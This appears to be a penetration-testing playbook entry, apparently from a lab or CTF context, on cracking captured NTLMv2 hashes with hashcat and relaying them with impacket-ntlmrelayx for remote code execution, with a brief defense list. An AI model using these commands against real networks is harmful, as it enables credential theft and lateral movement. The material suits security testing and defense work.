---
id: proc-uuid-3
name: Analyze-Captured-NTLMv2-Hashes
tags:
  - ntlmv2
  - cracking
  - relay
type: procedure
tools:
  - '[[tools/Hashcat]]'
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/hashcat-ntlmv2-crack]]'
verified: false
platforms:
  - Linux
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T03:46:09.062Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
---
# Analyze-Captured-NTLMv2-Hashes

## Summary

This procedure extracts and cracks captured NTLMv2 hashes from SMB auth attempts or sets up relays for further exploitation like RCE via SMB relay attacks.

## Description

Captured hashes from the SSRF include the server's domain credentials (e.g., TAKETWO domain). Offline cracking with tools like Hashcat can recover passwords, or relaying with ntlmrelayx can target internal services for code execution.

## Requirements

1. Captured hash file from SMB listener
2. Wordlist for cracking
3. Optional: Internal network access for relay

## Defense

Defensive measures and detection strategies:

- Enforce strong passwords and monitor for cracking attempts
- Disable NTLM where possible, prefer Kerberos
- IDS rules for SMB relay patterns and hash dumping

## Objectives

1. Recover plaintext credentials
2. Perform SMB relay to gain further access
3. Achieve RCE on relayed targets

## Instructions

### Step 1: Extract Hashes

**Context**: Parse logs to isolate NTLMv2 hashes in format username::domain:challenge:hash:...

No command; manually extract or use scripts to format into Hashcat-compatible file.

### Step 2: Crack Hashes Offline

**Context**: Use GPU-accelerated cracking against a wordlist.

**Command** ([[commands/hashcat-ntlmv2-crack]]):

```bash
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt -O
```

> Mode 5600 is for NTLMv2; -O optimizes for speed. Output shows cracked passwords.

### Step 3: Relay for RCE (Optional)

**Context**: If cracking fails, relay captured auth to internal SMB shares.

Use [[commands/impacket-ntlmrelayx]]:

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```

> Relays to specified targets, potentially executing commands via SMBExec.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Unsecured Credentials]] Unsecured Credentials

### Sub-Techniques

-

## Commands Used

- [[commands/hashcat-ntlmv2-crack]]

## Tools Used

- [[tools/Hashcat]]

## Tags

- ntlmv2
- cracking
- relay
